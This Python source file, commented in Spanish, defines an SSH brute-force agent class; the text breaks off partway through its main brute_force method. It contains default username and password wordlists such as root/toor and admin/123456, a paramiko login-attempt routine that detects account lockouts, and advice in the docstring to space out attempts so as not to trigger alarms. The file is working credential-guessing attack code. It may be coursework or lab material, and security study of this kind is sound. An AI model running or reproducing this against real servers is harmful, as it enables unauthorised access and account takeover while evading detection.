class BruteForceAgent:
    """
    Agente de fuerza bruta SSH.
    
    Objetivo: Intentar acceso SSH con diferentes combinaciones de
    usuario/contraseña.
    
    ⚠️ ADVERTENCIA:
    - SOLO usar en máquinas autorizadas
    - En máquinas de otros es ILEGAL
    - El servidor puede bloquear la cuenta después de N intentos fallidos
    - Respetar delays para no activar alarmas
    
    Autor: Diego Mercedes Llauger (2026-0048)
    """
    
    def __init__(self, timeout: int = 5):
        """
        Inicializa el agente.
        
        Args:
            timeout (int): Segundos para esperar respuesta SSH
        """
        self.timeout = timeout
        self.intentos_realizados = 0
        self.acceso_logrado = False
        self.credenciales_válidas = {}
        self.historial = []
    
    def cargar_diccionario_local(self, archivo_usuarios: str = None,
                                 archivo_contraseñas: str = None) -> Tuple[List[str], List[str]]:
        """
        Carga listas de usuarios y contraseñas desde archivos locales.
        
        Si no existen, usa listas predeterminadas.
        
        Args:
            archivo_usuarios (str): Archivo con usuarios (1 por línea)
            archivo_contraseñas (str): Archivo con contraseñas (1 por línea)
        
        Returns:
            Tuple[List, List]: (usuarios, contraseñas)
        """
        
        # Usuarios por defecto
        usuarios_default = [
            "root", "admin", "user", "test", "ubnt",
            "pi", "postgres", "mysql", "www-data"
        ]
        
        # Contraseñas por defecto (comunes)
        contraseñas_default = [
            "admin", "root", "toor", "password", "123456",
            "12345678", "1234567890", "admin123", "root123",
            "default", "ubnt", "vagrant", "123"
        ]
        
        # Intentar cargar archivos si existen
        usuarios = usuarios_default
        contraseñas = contraseñas_default
        
        if archivo_usuarios:
            try:
                with open(archivo_usuarios, 'r') as f:
                    usuarios = [line.strip() for line in f if line.strip()]
                print(f"[+] Usuarios cargados desde {archivo_usuarios}: {len(usuarios)}")
            except FileNotFoundError:
                print(f"[-] Archivo {archivo_usuarios} no encontrado, usando default")
        
        if archivo_contraseñas:
            try:
                with open(archivo_contraseñas, 'r') as f:
                    contraseñas = [line.strip() for line in f if line.strip()]
                print(f"[+] Contraseñas cargadas desde {archivo_contraseñas}: {len(contraseñas)}")
            except FileNotFoundError:
                print(f"[-] Archivo {archivo_contraseñas} no encontrado, usando default")
        
        return usuarios, contraseñas
    
    def intentar_acceso_ssh(self, ip: str, puerto: int,
                          usuario: str, contraseña: str) -> Dict:
        """
        Intenta conectar a SSH con credenciales específicas.
        
        Args:
            ip (str): IP objetivo
            puerto (int): Puerto SSH
            usuario (str): Usuario a intentar
            contraseña (str): Contraseña a intentar
        
        Returns:
            Dict: Resultado del intento
        """
        
        try:
            # Crear cliente SSH
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Intentar conectar
            ssh.connect(
                ip,
                port=puerto,
                username=usuario,
                password=contraseña,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )
            
            # Si llegó aquí, ¡conexión exitosa!
            ssh.close()
            
            return {
                "estado": "éxito",
                "mensaje": "Conexión SSH exitosa",
                "usuario": usuario,
                "contraseña": contraseña
            }
        
        except paramiko.AuthenticationException:
            return {
                "estado": "falló",
                "mensaje": "Autenticación rechazada",
                "usuario": usuario,
                "contraseña": contraseña
            }
        
        except paramiko.SSHException as e:
            # Podría ser cuenta bloqueada u otro error de SSH
            if "too many" in str(e).lower() or "locked" in str(e).lower():
                return {
                    "estado": "cuenta_bloqueada",
                    "mensaje": "Cuenta bloqueada por múltiples intentos fallidos",
                    "usuario": usuario,
                    "contraseña": contraseña
                }
            else:
                return {
                    "estado": "error_ssh",
                    "mensaje": str(e),
                    "usuario": usuario,
                    "contraseña": contraseña
                }
        
        except Exception as e:
            return {
                "estado": "error",
                "mensaje": str(e),
                "usuario": usuario,
                "contraseña": contraseña
            }
    
    def brute_force(self, ip: str, puerto: int = 22,
                   usuarios: List[str] = None,
                   contraseñas: List[str] = None,
                   max_intentos: int = 10,
                   delay: int = 300) -> Dict:
        """
        Ejecuta brute force SSH.
        
        PARÁMETROS RECOMENDADOS:
        - max_intentos: 10 (por seguridad)
        - delay: 300 segundos (5 minutos entre intentos)
        
        Args:
            ip (str): IP objetivo
            puerto (int): Puerto SSH (default 22)
            usuarios (List): Lista de usuarios a probar
            contraseñas (List): Lista de contraseñas a probar
            max_intentos (int): Máximo de intentos
            delay (int): Segundos a esperar entre intentos
        
        Returns:
            Dict: Resultados del brute force
        """
        
        # Usar default si no proporciona
        if not usuarios or not contraseñas:
            usuarios, contraseñas = self.cargar_diccionario_local()
        
        print("\n[*] Iniciando brute force SSH")
        print(f"[*] Objetivo: {ip}:{puerto}")
